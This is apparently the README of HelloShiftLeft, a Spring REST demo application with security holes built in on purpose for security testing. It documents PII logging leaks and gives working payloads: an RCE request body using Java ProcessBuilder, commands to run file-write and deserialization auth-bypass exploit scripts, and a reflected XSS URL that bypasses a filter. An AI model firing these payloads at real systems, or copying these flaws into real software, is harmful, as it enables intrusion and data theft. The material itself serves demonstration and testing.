# HelloShiftLeft

This is a demo application which provides a real world representation of a REST service that uses a mix of convention and configuration to simulate a decent set of vulnerabilities exposed in the code. It includes scenarios such as sensitive data leaking to logs, data secrets leaks, authentication bypass, remote code execution, XSS vulnerabilites etc. The sample sensitive data is a mix of financial data such as account information, medical data of patients, and other PII data such as customer information. HelloShiftLeft also contains patterns/anti-patterns of how data is used/abused in interfaces or channels (to and from HTTP/TCP, third-party, database) that can lead to vulnerabilites. The application is built on the Spring Framework and exposes a series of endpoints and APIs for queries and simulating exploits.

## Build
 ```sh
 $ git clone https://github.com/ShiftLeftSecurity/HelloShiftLeft.git
 $ cd HelloShiftLeft
 $ mvn clean package
 ```
 
## Run
 ```sh
 $ java -jar target/hello-shiftleft-0.0.1.jar
```

## Exercise Vulnerabilites and Exposures
Once the application starts, vulnerabilites and exposures in it can be tested with API access patterns described below and through example scripts provided in the [exploits](https://github.com/ShiftLeftSecurity/HelloShiftLeft/tree/master/exploits) directory. These are summarized below:  

### Sensitive Data Leaks to Log

| URL |  Purpose |
| --- | ------- |
| `http://localhost:8081/customers/1` | Returns JSON representation of Customer resource based on Id (1) specified in URL |
| `http://localhost:8081/customers` | Returns JSON representation of all available Customer resources |
| `http://localhost:8081/patients`  | Returns JSON representation of all available patients in record |
| `http://localhost:8081/account/1`  | Returns JSON representation of Account based on Id (1) specified |
| `http://localhost:8081/account`  | Returns JSON representation of all available accounts and their details |

All the above requests leak sensitive medical and PII data to the logging service. In addition other endpoints such as `/saveSettings`, `/search/user`, `/admin/login` etc. are also available. Along with the list above, users can explore variations of `GET`, `POST` and `PUT` requests sent to these endpoints.

### Remote Code Execution

An RCE can be triggered through the `/search/user` endpoint by sending a `POST` request as follows:
```
POST /search/user HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Upgrade-Insecure-Requests: 1
Content-Length: 86
Pragma: no-cache
Cache-Control: no-cache
DNT: 1
Connection: close

new java.lang.ProcessBuilder({'/bin/bash','-c','echo "3vilhax0r">/tmp/hacked'}).start()
```
This creates a file `/tmp/hacked` with the content `3vilhax0r`

### Arbritary File Write

The [filewriteexploit.py](https://github.com/ShiftLeftSecurity/HelloShiftLeft/blob/master/exploits/filewriteexploit.py) script can be executed as follows to trigger the arbritary file writing through the `/saveSettings` endpoint:
```
$ python2 filewriteexploit.py http://localhost:8081/saveSettings testfile 3vilhax0r
```
This creates a file named `testfile` with `3vilhax0r` as its contents

### Authentication Bypass

The [exploit.py](https://github.com/ShiftLeftSecurity/helloshiftleft/blob/master/exploits/JavaSerializationExploit/src/main/java/exploit.py) script allows an authentication bypass by exposing a deserialization vulnerability which allows administrator access:
```
$ python2 exploit.py
```

This returns the following sensitive data:

```
Customer;Month;Volume
Netflix;January;200,000
Palo Alto;January;200,000
```

### XSS

A reflected XSS vulnerability exists in the application and can be triggered using the _hidden_ `/debug` endpoint as follows:

```
http://localhost:8080/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=123&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432<scriscriptpt>alert(1)</sscriptcript>
```

It raises and alert dialogue and returns the Customer object data.
